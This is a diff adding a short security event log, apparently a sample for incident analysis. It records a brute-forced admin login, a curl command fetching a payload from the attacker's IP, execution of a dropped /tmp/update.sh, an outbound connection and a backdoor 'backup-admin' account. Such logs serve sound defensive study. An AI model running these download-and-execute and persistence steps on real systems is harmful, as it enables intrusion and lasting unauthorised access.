@@ -1,0 +1,12 @@
+09:45:01 LOGIN_FAILED user=admin ip=185.23.45.10
+09:45:03 LOGIN_FAILED user=admin ip=185.23.45.10
+09:45:05 LOGIN_FAILED user=admin ip=185.23.45.10
+09:45:07 LOGIN_SUCCESS user=admin ip=185.23.45.10
+09:45:12 COMMAND_EXECUTED user=admin command="whoami"
+09:45:18 COMMAND_EXECUTED user=admin command="curl http://185.23.45.10/payload"
+09:45:25 FILE_CREATED user=admin file="/tmp/update.sh"
+09:45:31 COMMAND_EXECUTED user=admin command="chmod +x /tmp/update.sh"
+09:45:35 COMMAND_EXECUTED user=admin command="/tmp/update.sh"
+09:46:02 OUTBOUND_CONNECTION process="update.sh" destination=185.23.45.10:443
+09:46:15 USER_CREATED user="backup-admin"
+09:46:30 LOGIN_SUCCESS user=backup-admin ip=185.23.45.10
